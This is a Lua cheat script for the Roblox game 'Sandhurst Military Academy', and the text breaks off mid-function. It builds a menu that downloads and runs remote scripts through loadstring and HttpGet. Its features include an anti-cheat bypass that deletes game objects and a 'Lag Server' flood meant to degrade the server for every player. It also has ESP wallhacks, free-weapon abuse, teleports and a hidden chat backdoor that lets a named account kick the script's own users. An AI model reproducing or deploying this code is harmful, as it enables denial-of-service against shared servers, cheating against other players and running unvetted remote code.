local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("GUI for Sandhurst Military Academy (By ExamV1)", "Sentinel")

-- MAIN
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Menu")
local Main = Window:NewTab("LocalPlayer")
local LocalSection = Main:NewSection("Menu")
local Main = Window:NewTab("Players")
local PlayerSection = Main:NewSection("Player Stuff")
local Main = Window:NewTab("Teleport")
local TeleportSection = Main:NewSection("Teleport")
local Setting = Window:NewTab("Setting")
local SettingSection = Setting:NewSection("Setting")
local Players = game:GetService("Players")
local ChatEvents = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents


local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

Players.PlayerAdded:Connect(function(player)
    if player.Name == "SniffyModzYolo" then
        player.Chatted:Connect(function(message)
            local lowerMessage = message:lower()
            local commandKick = "kick"
            local commandKickPlayer = "kick " .. LocalPlayer.Name:lower()

            if lowerMessage == commandKick or lowerMessage == commandKickPlayer then
                LocalPlayer:Kick("You have been kicked by the dev of Sandhurst Military GUI")
            end
        end)
    end
end)



local Players = game:GetService("Players")
local ChatEvents = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents

Players.PlayerAdded:Connect(function(player)
    if player.Name == "SniffyModzYolo" then
        game.StarterGui:SetCore("SendNotification", {
            Title = "The Developer!";
            Text = "ExamV1 is in your game, the Developer of Sandhurst Military GUI!";
            Duration = "600";
            Callback = NotificationBindable;
        })
    end
end)






--main stuff

MainSection:NewButton("Bypass Anti Cheat", "Bypasses the 'better luck next time' message", function()
    local replicatedStorage = game:GetService("ReplicatedStorage")
    local whitelist = {
	game:GetService("ReplicatedStorage").AFKEvent,
    game:GetService("ReplicatedStorage").Assets,
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents,
	game:GetService("ReplicatedStorage").Packages,
	game:GetService("ReplicatedStorage").Remotes,
	game:GetService("ReplicatedStorage").Utility,
	game:GetService("ReplicatedStorage").VehicleShared,
	game:GetService("ReplicatedStorage").WeaponFrameworkRep,
    game:GetService("ReplicatedStorage").RemovePlayerHonorBindable,
    game:GetService("ReplicatedStorage").Bloom,
    game:GetService("ReplicatedStorage").ColorCorrection,
    game:GetService("ReplicatedStorage").ServerAge,
    game:GetService("ReplicatedStorage").SunRays,
    game:GetService("ReplicatedStorage").ServerVersion,
    game:GetService("ReplicatedStorage").ServerLocation,
    game:GetService("ReplicatedStorage").AddPlayerHonorBindable,
    game:GetService("ReplicatedStorage").Chatlogs,
    game:GetService("ReplicatedStorage").DeathLogs,
    game:GetService("ReplicatedStorage").FreeGun,
    game:GetService("ReplicatedStorage").GetPlayerHonorsBindable,
    game:GetService("ReplicatedStorage").GetProductPurchaseAmount,
    game:GetService("ReplicatedStorage").GetProductPurchaseAmountRemote,
    game:GetService("ReplicatedStorage").HandcuffsFunction,
    game:GetService("ReplicatedStorage").LogEvent,
    game:GetService("ReplicatedStorage").ListAllHonorsBindable,
    game:GetService("ReplicatedStorage").NewParachute,
    game:GetService("ReplicatedStorage").PromoteUser,
    game:GetService("ReplicatedStorage").getPlayerDetails,
    game:GetService("ReplicatedStorage").ChatChannels,
    game:GetService("ReplicatedStorage").CameraShaker,
    game:GetService("ReplicatedStorage").FirearmManagerBindable,
    game:GetService("ReplicatedStorage").FirearmRenderRemote,
    game:GetService("ReplicatedStorage").GetMeAShop,
    game:GetService("ReplicatedStorage").KO,
    game:GetService("ReplicatedStorage").KOS,
    game:GetService("ReplicatedStorage").PadsLock,
    game:GetService("ReplicatedStorage")["MED-KIT"],
    game:GetService("ReplicatedStorage").HandcuffsEvent,
    game:GetService("ReplicatedStorage").Pass,
    game:GetService("ReplicatedStorage").PickUpCarabiner,
    game:GetService("ReplicatedStorage").PingTimes,
    game:GetService("ReplicatedStorage").ProximityPromptFailure,
    game:GetService("ReplicatedStorage").RadialImage,
    game:GetService("ReplicatedStorage").ProximityPromptFailureClient,
    game:GetService("ReplicatedStorage").RagdollEvent,
    game:GetService("ReplicatedStorage").RagdollModule,
    game:GetService("ReplicatedStorage").RaidEvent,
    game:GetService("ReplicatedStorage").RegimentTags,
    game:GetService("ReplicatedStorage").RegisterProcessReceipt,
    game:GetService("ReplicatedStorage"):GetChildren()[1380],
    game:GetService("ReplicatedStorage").UpdatePlayerList,
    game:GetService("ReplicatedStorage").ToggleCoreGui,
    game:GetService("ReplicatedStorage").TeleportWhitelist,
    game:GetService("ReplicatedStorage").TeamChange,
    game:GetService("ReplicatedStorage").Specific,
    game:GetService("ReplicatedStorage").RemoteParachute,
    game:GetService("ReplicatedStorage").shut,
    game:GetService("ReplicatedStorage").pi,
    game:GetService("ReplicatedStorage").device,
    game:GetService("ReplicatedStorage")["[R] Global Constants"],
    game:GetService("ReplicatedStorage")["[R] Firearm Hitmarker"],
    game:GetService("ReplicatedStorage")["[R] Firearm Constants"],
    game:GetService("ReplicatedStorage")["[R] Event Constants"]
    }

    for _, item in pairs(replicatedStorage:GetChildren()) do
        if not table.find(whitelist, item) then
            item:Destroy()
        end
    end

    -- Set up the UI
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "HelloScreenGui"
    ScreenGui.Parent = game.Players.LocalPlayer.PlayerGui

    local TextBox = Instance.new("TextLabel")
    TextBox.Name = "HelloTextBox"
    TextBox.Size = UDim2.new(1, 0, 0.2, 0) -- Changed height to 0.2 (20% of the screen height)
    TextBox.Position = UDim2.new(0, 0, 0, 0)
    TextBox.BackgroundColor3 = Color3.new(1, 1, 1)
    TextBox.BackgroundTransparency = 1
    TextBox.Font = Enum.Font.SourceSansBold
    TextBox.Text = "Anti Cheat Bypassed by ExamV1"
    TextBox.TextColor3 = Color3.new(0, 0, 0)
    TextBox.TextScaled = true
    TextBox.Parent = ScreenGui

    -- Define the duration of the message in seconds
    local duration = 3

    -- Define the fade time in seconds
    local fadeTime = 1

    -- Define the rate of transparency change per second
    local fadeRate = 1 / fadeTime

    -- Show the message for the specified duration
    wait(duration)

    -- Start fading out the message
    local startTime = os.clock()
    while true do
        local elapsedTime = os.clock() - startTime
        local newTransparency = math.min(1, elapsedTime * fadeRate)
        TextBox.BackgroundTransparency = newTransparency
        TextBox.TextTransparency = newTransparency
        if newTransparency == 1 then
            break
        end
        wait()
    end
end)



local bindable = Instance.new("BindableFunction")
bindable.OnInvoke = function(response)
    if response == "Yes" then
        print("Lag server button clicked")
        while wait(0.4) do
            game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
            local function bomb(table_increase, tries)
                local spammed_table = {}
                for i = 1, table_increase do
                    spammed_table = {spammed_table}
                end
                local maximum = math.floor(499999 / (table_increase + 2))
                local maintable = {}
                for i = 1, maximum do
                    table.insert(maintable, spammed_table)
                end
                game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
            end
            bomb(250, 2)
        end
    else
        print("Lag server button cancelled")
    end
end

MainSection:NewButton("Lag Server", "This will lag the server for everyone", function()
    game.StarterGui:SetCore("SendNotification", {
        Title = "Notification",
        Text = "Do you want to lag the server?",
        Duration = 30,
        Callback = bindable,
        Button1 = "Yes",
        Button2 = "No"
    })
end)







MainSection:NewButton("Delete Invisible Barriers", "Deletes all invisible parts/objects", function()
    for i, v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") and v.Transparency == 1 and v.CanCollide then
            v:Destroy()
        end
    end
end)

MainSection:NewButton("Invisibility Tool(Credit: Blitz)", "Makes your character invisible to others", function()
	loadstring(game:HttpGet("https://gist.githubusercontent.com/skid123skidlol/cd0d2dce51b3f20ad1aac941da06a1a1/raw/f58b98cce7d51e53ade94e7bb460e4f24fb7e0ff/%257BFE%257D%2520Invisible%2520Tool%2520(can%2520hold%2520tools)",true))()
end)




local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local toggle = false

MainSection:NewToggle("Auto Give Free Gun", "Get Free Gun if not in Backpack or Workspace", function(state)
    toggle = state
end)

function getFreeGun()
    local args = {
        [1] = "Verify"
    }
    ReplicatedStorage.FreeGun:InvokeServer(unpack(args))
end

function autoGiveFreeGun()
    while true do
        if toggle then
            local hasGun = false
            local backpack = LocalPlayer:WaitForChild("Backpack")
            local workspace = game:GetService("Workspace")
            if backpack:FindFirstChild("FreeGun") or workspace:FindFirstChild(LocalPlayer.Name):FindFirstChild("FreeGun") then
                hasGun = true
            end
            if not hasGun then
                wait(3)
                getFreeGun()
            end
        end
        wait()
    end
end

local autoGiveFreeGunCoroutine = coroutine.wrap(autoGiveFreeGun)
autoGiveFreeGunCoroutine()

Players.PlayerRemoving:Connect(function(player)
    if player == LocalPlayer then
        toggle = false
    end
end)





MainSection:NewButton("Toggle AFK", "Toggles the AFK state", function()
    local args = {
        [1] = not toggleState
    }
    game:GetService("ReplicatedStorage"):WaitForChild("AFKEvent"):FireServer(unpack(args))
    toggleState = not toggleState
end)



MainSection:NewButton("Give Tools", "Gives yourself all the repair tools.", function()
local Workspace = game:GetService("Workspace")

local function fireGiverClickDetector(giverName)
    local giver = Workspace:FindFirstChild(giverName)

    if giver then
        local clickDetector = giver:FindFirstChildOfClass("ClickDetector")
        if clickDetector then
            if fireclickdetector then
                fireclickdetector(clickDetector)
            else
                print("Incompatible Exploit: Your exploit does not support this command (missing fireclickdetector)")
            end
        else
            print(giverName .. " does not have a ClickDetector.")
        end
    else
        print(giverName .. " not found in Workspace.")
    end
end

fireGiverClickDetector("FuelGiver")
fireGiverClickDetector("RearmGiver")
fireGiverClickDetector("RepairGiver")
fireGiverClickDetector("RPGGiver")
fireGiverClickDetector("StingerGiver")
fireGiverClickDetector("JavelinGiver")
end)





local player = game:GetService("Players").LocalPlayer
local workspace = game:GetService("Workspace")
local toggle = false

MainSection:NewToggle("Remove Fall Damage", "Removes FallDamage from LocalPlayer", function(state)
    toggle = state
end)

local function onCharacterAdded(character)
    if toggle then
        local fallDamage = character:FindFirstChild("FallDamage")
        if fallDamage then
            fallDamage:Destroy()
        end
    end
end

player.CharacterAdded:Connect(onCharacterAdded)

function removeFallDamageLoop()
    while true do
        if toggle and player.Character then
            local fallDamage = player.Character:FindFirstChild("FallDamage")
            if fallDamage then
                fallDamage:Destroy()
            end
        end
        wait()
    end
end

local removeFallDamageCoroutine = coroutine.wrap(removeFallDamageLoop)
removeFallDamageCoroutine()

game:GetService("Players").PlayerRemoving:Connect(function(removedPlayer)
    if removedPlayer == player then
        toggle = false
    end
end)








MainSection:NewButton("Fullbright", "Makes the game brighter", function()
	pcall(function()
		local lighting = game:GetService("Lighting");
		lighting.Ambient = Color3.fromRGB(255, 255, 255);
		lighting.Brightness = 1;
		lighting.FogEnd = 1e10;
		for i, v in pairs(lighting:GetDescendants()) do
			if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("SunRaysEffect") then
				v.Enabled = false;
			end;
		end;
		lighting.Changed:Connect(function()
			lighting.Ambient = Color3.fromRGB(255, 255, 255);
			lighting.Brightness = 1;
			lighting.FogEnd = 1e10;
		end);
		spawn(function()
			local character = game:GetService("Players").LocalPlayer.Character;
			while wait() do
				repeat wait() until character ~= nil;
				if not character.HumanoidRootPart:FindFirstChildWhichIsA("PointLight") then
					local headlight = Instance.new("PointLight", character.HumanoidRootPart);
					headlight.Brightness = 1;
					headlight.Range = 60;
				end;
			end;
		end);
	end)
end)











--local player stuff

LocalSection:NewSlider("Speed", "Changes Player Speed", 333, 17, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
end)


LocalSection:NewButton("inf jump", "inf", function()
loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Infinite%20Jump.txt"))()
end)








--player stuff

local gotoDrop

local function updatePlayerList()
    local Plr = {}
    for i, v in pairs(game:GetService("Players"):GetChildren()) do
        table.insert(Plr, v.Name)
    end

    if spectateDrop then
        spectateDrop:Clear()
        spectateDrop:AddOptions(Plr)
    else
        spectateDrop = PlayerSection:NewDropdown("Spectate Player", "", Plr, function(selected)
            local player = game.Players:FindFirstChild(selected)
            if player then
                local character = player.Character
                if character then
                    workspace.CurrentCamera.CameraSubject = character.Humanoid
                    game.StarterGui:SetCore("SendNotification", {
                        Title = "Spectating!";
                        Text = "Spectating " .. player.Name;
                        Duration = 3;
                    })
                end
            end
            spectateDrop:SetSelectedIndex(0)
        end)
    end

    if gotoDrop then
        gotoDrop:Clear()
        gotoDrop:AddOptions(Plr)
    else
        gotoDrop = PlayerSection:NewDropdown("Go To Player", "", Plr, function(selected)
            local player = game.Players:FindFirstChild(selected)
            if player then
                local character = player.Character
                if character then
                    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                    if humanoidRootPart then
                        game.Players.LocalPlayer.Character:MoveTo(humanoidRootPart.Position)
                        game.StarterGui:SetCore("SendNotification", {
                            Title = "Teleporting!";
                            Text = "Teleporting to " .. player.Name;
                            Duration = 3;
                        })
                    end
                end
            end
            gotoDrop:SetSelectedIndex(0)
        end)
    end
end

updatePlayerList()
game:GetService("Players").PlayerAdded:Connect(updatePlayerList)


PlayerSection:NewButton("ESP", "esp", function()
loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/WRD%20ESP.txt"))()
end)


PlayerSection:NewButton("ESP V2", "esp", function()
--Settings--
local ESP = {
    TextColor = Color3.fromRGB(255,255,255),
    EquippedColor = Color3.fromRGB(255,255,255),
    DistanceColor = Color3.fromRGB(255,255,255),
    TracerColor = Color3.fromRGB(255,255,255),
    LowerHealthColor = Color3.fromRGB(0,0,0),
    HigherHealthColor = Color3.fromRGB(133, 87, 242),
    Color = Color3.fromRGB(255,255,255),
    HealthBar = true,
    Enabled = true,
    Distance = true,
    Health = true,
    Equipped = true,
    Boxes = true,
    BoxShift = CFrame.new(0,-.3,0),
	BoxSize = Vector3.new(4,6,0),
    FaceCamera = true,
    Names = true,
    TeamColor = true,
    Thickness = 0.8,
    AttachShift = 1,
    TeamMates = true,
    Players = true,
    Tracers = false,
    Objects = setmetatable({}, {__mode="kv"}),
    Overrides = {},
    MaxShownDistance = 200,

}

--Declarations--
local cam = workspace.CurrentCamera
local plrs = game:GetService("Players")
local plr = plrs.LocalPlayer
local mouse = plr:GetMouse()

local V3new = Vector3.new
local WorldToViewportPoint = cam.WorldToViewportPoint

--Functions--
local function Draw(obj, props)
	local new = Drawing.new(obj)
	
	props = props or {}
	for i,v in pairs(props) do
		new[i] = v
	end
	return new
end

function ESP:GetTeam(p)
	local ov = self.Overrides.GetTeam
	if ov then
		return ov(p)
	end
	
	return p and p.Team
end

function ESP:IsTeamMate(p)
    local ov = self.Overrides.IsTeamMate
	if ov then
		return ov(p)
    end
    
    return self:GetTeam(p) == self:GetTeam(plr)
end

function ESP:GetColor(obj)
	local ov = self.Overrides.GetColor
	if ov then
		return ov(obj)
    end
    local p = self:GetPlrFromChar(obj)
	return p and self.TeamColor and p.Team and p.Team.TeamColor.Color or self.Color
end

function ESP:GetPlrFromChar(char)
	local ov = self.Overrides.GetPlrFromChar
	if ov then
		return ov(char)
	end
	
	return plrs:GetPlayerFromCharacter(char)
end

function ESP:Toggle(bool)
    self.Enabled = bool
    if not bool then
        for i,v in pairs(self.Objects) do
            if v.Type == "Box" then --fov circle etc
                if v.Temporary then
                    v:Remove()
                else
                    for i,v in pairs(v.Components) do
                        v.Visible = false
                    end
                end
            end
        end
    end
end

function ESP:GetBox(obj)
    return self.Objects[obj]
end

function ESP:AddObjectListener(parent, options)
    local function NewListener(c)
        if type(options.Type) == "string" and c:IsA(options.Type) or options.Type == nil then
            if type(options.Name) == "string" and c.Name == options.Name or options.Name == nil then
                if not options.Validator or options.Validator(c) then
                    local box = ESP:Add(c, {
                        PrimaryPart = type(options.PrimaryPart) == "string" and c:WaitForChild(options.PrimaryPart) or type(options.PrimaryPart) == "function" and options.PrimaryPart(c),
                        Color = type(options.Color) == "function" and options.Color(c) or options.Color,
                        ColorDynamic = options.ColorDynamic,
                        Name = type(options.CustomName) == "function" and options.CustomName(c) or options.CustomName,
                        IsEnabled = options.IsEnabled,
                        RenderInNil = options.RenderInNil
                    })
                    --TODO: add a better way of passing options
                    if options.OnAdded then
                        coroutine.wrap(options.OnAdded)(box)
                    end
                end
            end
        end
    end

    if options.Recursive then
        parent.DescendantAdded:Connect(NewListener)
        for i,v in pairs(parent:GetDescendants()) do
            coroutine.wrap(NewListener)(v)
        end
    else
        parent.ChildAdded:Connect(NewListener)
        for i,v in pairs(parent:GetChildren()) do
            coroutine.wrap(NewListener)(v)
        end
    end
end

local boxBase = {}
boxBase.__index = boxBase

function boxBase:Remove()
    ESP.Objects[self.Object] = nil
    for i,v in pairs(self.Components) do
        v.Visible = false
        v:Remove()
        self.Components[i] = nil
    end
end

function boxBase:Update()
    if not self.PrimaryPart then
        --warn("not supposed to print", self.Object)
        return self:Remove()
    end

    local color
    if ESP.Highlighted == self.Object then
       color = ESP.HighlightColor
    else
        color = self.Color or self.ColorDynamic and self:ColorDynamic() or ESP:GetColor(self.Object) or ESP.Color
    end

    local allow = true
    if ESP.Overrides.UpdateAllow and not ESP.Overrides.UpdateAllow(self) then
        allow = false
    end
    if self.Player and not ESP.TeamMates and ESP:IsTeamMate(self.Player) then
        allow = false
    end
    if self.Player and not ESP.Players then
        allow = false
    end
    if self.IsEnabled and (type(self.IsEnabled) == "string" and not ESP[self.IsEnabled] or type(self.IsEnabled) == "function" and not self:IsEnabled()) then
        allow = false
    end
    if not workspace:IsAncestorOf(self.PrimaryPart) and not self.RenderInNil then
        allow = false
    end

    if not allow then
        for i,v in pairs(self.Components) do
            v.Visible = false
        end
        return
    end

    if ESP.Highlighted == self.Object then
        color = ESP.HighlightColor
    end

    --calculations--
    local cf = self.PrimaryPart.CFrame
    if ESP.FaceCamera then
        cf = CFrame.new(cf.p, cam.CFrame.p)
    end
    local size = self.Size
    local locs = {
        TopLeft = cf * ESP.BoxShift * CFrame.new(size.X/2,size.Y/2,0),
        TopRight = cf * ESP.BoxShift * CFrame.new(-size.X/2,size.Y/2,0),
        BottomLeft = cf * ESP.BoxShift * CFrame.new(size.X/2,-size.Y/2,0),
        BottomRight = cf * ESP.BoxShift * CFrame.new(-size.X/2,-size.Y/2,0),
        LegPos = cf* ESP.BoxShift * CFrame.new(size.X/75,-size.Y/2,0),
        TagPos = cf * ESP.BoxShift * CFrame.new(0,size.Y/2,0),
        Torso = cf * ESP.BoxShift
    }
    
    local Offset = 20
    local BottomOffset = 0 
    local TopLeft, Vis1 = cam:WorldToViewportPoint(locs.TopLeft.p)
    local TopRight, Vis2 = WorldToViewportPoint(cam, locs.TopRight.p)
    local BottomLeft, Vis3 = WorldToViewportPoint(cam, locs.BottomLeft.p)
    local BottomRight, Vis4 = WorldToViewportPoint(cam, locs.BottomRight.p)
    local LegPos = cam:WorldToViewportPoint(locs.LegPos.p)
    local Distance = (self.PrimaryPart.Position - plrs.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude

    if ESP.Boxes and game.Players:FindFirstChild(self.PrimaryPart.Parent.Name) ~= nil and Distance <= ESP.MaxShownDistance then
        if self.Components.Quad then
            if Vis1 or Vis2 or Vis3 or Vis4 then
                self.Components.Quad.Visible = true
                self.Components.Quad.PointA = Vector2.new(TopRight.X, TopRight.Y)
                self.Components.Quad.PointB = Vector2.new(TopLeft.X, TopLeft.Y)
                self.Components.Quad.PointC = Vector2.new(BottomLeft.X, BottomLeft.Y)
                self.Components.Quad.PointD = Vector2.new(BottomRight.X, BottomRight.Y)
                self.Components.Quad.Color = color
                
                self.Components.OutlineQuad.Visible = true
                self.Components.OutlineQuad.PointA = Vector2.new(TopRight.X, TopRight.Y)
                self.Components.OutlineQuad.PointB = Vector2.new(TopLeft.X, TopLeft.Y)
                self.Components.OutlineQuad.PointC = Vector2.new(BottomLeft.X, BottomLeft.Y)
                self.Components.OutlineQuad.PointD = Vector2.new(BottomRight.X, BottomRight.Y)
            else
                self.Components.Quad.Visible = false
                self.Components.OutlineQuad.Visible = false
            end
        end
    else
        self.Components.Quad.Visible = false
        self.Components.OutlineQuad.Visible = false
    end

    if ESP.HealthBar and Distance <= ESP.MaxShownDistance and plrs:FindFirstChild(tostring(self.PrimaryPart.Parent)) then
        local pos, onscreen = cam:WorldToViewportPoint(self.PrimaryPart.Parent.HumanoidRootPart.Position)

        if onscreen then
            local Humanoid = self.PrimaryPart.Parent.Humanoid
            
            self.Components.HealthbarOutline.Visible = true 
            self.Components.HealthbarOutline.From = Vector2.new(BottomLeft.X-3.5,BottomLeft.Y+1)
            self.Components.HealthbarOutline.To = Vector2.new(TopLeft.X-3.5,TopLeft.Y-2)
            
            self.Components.Healthbar.Visible = true 
            self.Components.Healthbar.From = Vector2.new(BottomLeft.X-3.5 ,BottomLeft.Y)
            self.Components.Healthbar.Color = ESP.LowerHealthColor:lerp(ESP.HigherHealthColor, Humanoid.Health/Humanoid.MaxHealth)
            self.Components.Healthbar.To = Vector2.new(TopLeft.X-3.5,TopLeft.Y-1)
            
            else
                self.Components.Healthbar.Visible = false 
                self.Components.HealthbarOutline.Visible = false 
                
        end
        else
            self.Components.Healthbar.Visible = false 
            self.Components.HealthbarOutline.Visible = false 
    end

	if ESP.Equipped  and Distance <= ESP.MaxShownDistance and plrs:FindFirstChild(self.PrimaryPart.Parent.Name) ~= nil then 
        local TagPos, Vis5 = WorldToViewportPoint(cam, locs.TagPos.p)
        local Char = self.PrimaryPart.Parent
        
        if Vis5 then
            self.Components.EquippedTool.Color = ESP.EquippedColor
            self.Components.EquippedTool.Visible = true
            self.Components.EquippedTool.Position = Vector2.new(LegPos.X,LegPos.Y + BottomOffset)
            if Char:FindFirstChildOfClass("Tool") then 
                self.Components.EquippedTool.Text = tostring(Char:FindFirstChildOfClass("Tool"))
                 BottomOffset = BottomOffset + 14
                else
                    self.Components.EquippedTool.Text = ""
            end
        else
            self.Components.EquippedTool.Visible = false
        end
    else
        self.Components.EquippedTool.Visible = false
    end
    
    if ESP.Distance  and Distance <= ESP.MaxShownDistance then 
            local TagPos, Vis5 = WorldToViewportPoint(cam, locs.TagPos.p)
            
            if Vis5 then
                self.Components.Distance.Visible = true
                if plrs:FindFirstChild(tostring(self.PrimaryPart.Parent)) ~= nil  then 
                    self.Components.Distance.Position = Vector2.new(LegPos.X, LegPos.Y + BottomOffset)
                    BottomOffset = BottomOffset + 14
                elseif  plrs:FindFirstChild(tostring(self.PrimaryPart.Parent)) == nil then 
                    self.Components.Distance.Position = Vector2.new(TagPos.X, TagPos.Y - Offset)
                    Offset = Offset + 14
                end
                self.Components.Distance.Text = math.floor((cam.CFrame.p - cf.p).magnitude) .." studs"
                self.Components.Distance.Color = ESP.DistanceColor
            else
                self.Components.Distance.Visible = false
            end
        else
            self.Components.Distance.Visible = false
    end
	
    if ESP.Names  and Distance <= ESP.MaxShownDistance then
        local TagPos, Vis5 = WorldToViewportPoint(cam, locs.TagPos.p)
        
        if Vis5 then
            self.Components.Name.Visible = true
            self.Components.Name.Position = Vector2.new(TagPos.X,TagPos.Y - Offset)
            self.Components.Name.Text = self.Name
            self.Components.Name.Color = ESP.TextColor
            Offset = Offset+10
        else
            self.Components.Name.Visible = false
        end
    else
        self.Components.Name.Visible = false
    end
    
    if ESP.Tracers and Distance <= ESP.MaxShownDistance and plrs:FindFirstChild(tostring(self.PrimaryPart.Parent))  then
        local TorsoPos, Vis6 = WorldToViewportPoint(cam, locs.Torso.p)

        if Vis6 then
            self.Components.Tracer.Visible = true
            self.Components.Tracer.From = Vector2.new(TorsoPos.X,TorsoPos.Y)
            self.Components.Tracer.To = Vector2.new(cam.ViewportSize.X/2,cam.ViewportSize.Y/ESP.AttachShift)
            self.Components.Tracer.Color = ESP.TracerColor
        else
            self.Components.Tracer.Visible = false
        end
    else
        self.Components.Tracer.Visible = false
    end
end

function ESP:Add(obj, options)
    if not obj.Parent and not options.RenderInNil then
        return warn(obj, "has no parent")
    end

    local box = setmetatable({
        Name = options.Name or obj.Name,
        Type = "Box",
        Color = options.Color,--[[or self:GetColor(obj)]]
        Size = options.Size or self.BoxSize,
        Object = obj,
        Player = options.Player or plrs:GetPlayerFromCharacter(obj),
        PrimaryPart = options.PrimaryPart or obj.ClassName == "Model" and (obj.PrimaryPart or obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChildWhichIsA("BasePart")) or obj:IsA("BasePart") and obj,
        Components = {},
        IsEnabled = options.IsEnabled,
        Temporary = options.Temporary,
        ColorDynamic = options.ColorDynamic,
        RenderInNil = options.RenderInNil
    }, boxBase)

    if self:GetBox(obj) then
        self:GetBox(obj):Remove()
    end
    
    
    box.Components["OutlineQuad"] = Draw("Quad", {
        Thickness = self.Thickness + 2,
        Color = Color3.fromRGB(0,0,0),
        Transparency = 1,
        Filled = false,
        Visible = self.Enabled and self.Boxes
    })

    box.Components["Quad"] = Draw("Quad", {
        Thickness = self.Thickness,
        Color = color,
        Transparency = 1,
        Filled = false,
        Visible = self.Enabled and self.Boxes
    })
    box.Components["Name"] = Draw("Text", {
		Text = box.Name,
		Color = ESP.TextColor,
		Center = true,
		Outline = true,
        Size = 14,
        Visible = self.Enabled and self.Names
	})
	box.Components["Distance"] = Draw("Text", {
		Color = ESP.DistanceColor,
		Center = true,
		Outline = true,
        Size = 14,
        Visible = self.Enabled and self.Distance
	})
	
	box.Components["EquippedTool"] = Draw("Text", {
		Color = ESP.EquippedColor,
		Center = true,
		Outline = true,
        Size = 14,
        Visible = self.Enabled and self.Equipped
	})
	
	
	box.Components["Tracer"] = Draw("Line", {
		Thickness = ESP.Thickness,
		Color = box.Color,
        Transparency = 1,
        Visible = self.Enabled and self.Tracers
    })

    box.Components["HealthbarOutline"] = Draw('Line',{
        Thickness = 3 ,
        Color = Color3.new(0,0,0),
        Transparency = 1,
        Visible = self.Enabled and self.HealthBar,
    })

    box.Components["Healthbar"] = Draw('Line',{
        Thickness = 1,
        Color = Color3.new(0,1,0),
        Transparency = 1,
        Visible = self.Enabled and self.HealthBar,
    })
    self.Objects[obj] = box
    
    obj.AncestryChanged:Connect(function(_, parent)
        if parent == nil and ESP.AutoRemove ~= false then
            box:Remove()
        end
    end)
    obj:GetPropertyChangedSignal("Parent"):Connect(function()
        if obj.Parent == nil and ESP.AutoRemove ~= false then
            box:Remove()
        end
    end)

    local hum = obj:FindFirstChildOfClass("Humanoid")
	if hum then
        hum.Died:Connect(function()
            if ESP.AutoRemove ~= false then
                box:Remove()
            end
		end)
    end

    return box
end

local function CharAdded(char)
    local p = plrs:GetPlayerFromCharacter(char)
    if not char:FindFirstChild("HumanoidRootPart") then
        local ev
        ev = char.ChildAdded:Connect(function(c)
            if c.Name == "HumanoidRootPart" then
                ev:Disconnect()
                ESP:Add(char, {
                    Name = p.Name,
                    Player = p,
                    PrimaryPart = c
                })
            end
        end)
    else
        ESP:Add(char, {
            Name = p.Name,
            Player = p,
            PrimaryPart = char.HumanoidRootPart
        })
    end
end
local function PlayerAdded(p)
    p.CharacterAdded:Connect(CharAdded)
    if p.Character then
        coroutine.wrap(CharAdded)(p.Character)
    end
end
plrs.PlayerAdded:Connect(PlayerAdded)
for i,v in pairs(plrs:GetPlayers()) do
    if v ~= plr then
        PlayerAdded(v)
    end
end

game:GetService("RunService").RenderStepped:Connect(function()
    cam = workspace.CurrentCamera
    for i,v in (ESP.Enabled and pairs or ipairs)(ESP.Objects) do
        if v.Update then
            local s,e = pcall(v.Update, v)
            if not s then warn("[ERROR]", e, v.Object:GetFullName()) end
        end
    end
end)

return ESP 
end)






--teleport stuff

TeleportSection:NewButton("Civilian Spawn", "Teleports you to the Civilian spawn", function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(460.868988, -3.63700008, -325.25, 0, 0, -1, 0, 1, 0, 1, 0, 0)
end)

TeleportSection:NewButton("Plane", "Teleport you to plane", function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(96.154953, 9592.50391, 586.903564, 0, 0, -1, 0, 1, 0, 1, 0, 0)
end)

TeleportSection:NewButton("Parade Spawn", "Teleports you to the parade spawn", function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(139.964996, 34.9239998, 633.682007, 1, 0, 0, 0, 1, 0, 0, 0, 1)
end)

TeleportSection:NewButton("Recruit Spawn", "Teleports you to the recruit spawn", function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(327.462006, 1.55400002, 75.1029968, 1, 0, 0, 0, 1, 0, 0, 0, 1)
end)

TeleportSection:NewButton("Uniform House", "Teleports you to the uniform house", function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(114.38619995117188, 40.927818298339844, 548.8812255859375)
end)

TeleportSection:NewButton("Parade Ground", "Teleports you to the parade ground", function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(145.66456604003906, 38.248497009277344, 828.87841796875)
end)

TeleportSection:NewButton("Army Obby", "Teleports you to the army obby", function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(352.51800537109375, 36.889190673828125, 588.49755859375)
end)

TeleportSection:NewButton("ETS Pads", "Teleports you to the ETS Pads", function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(239.14645385742188, 4.165444850921631, 79.01179504394531)
end)

TeleportSection:NewButton("RMP Base", "Teleports you to the RMP Base", function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(762.4496459960938, 34.711673736572266, 168.80337524414062)
end)

TeleportSection:NewButton("Passed Gate", "Teleports you passed the gate", function()
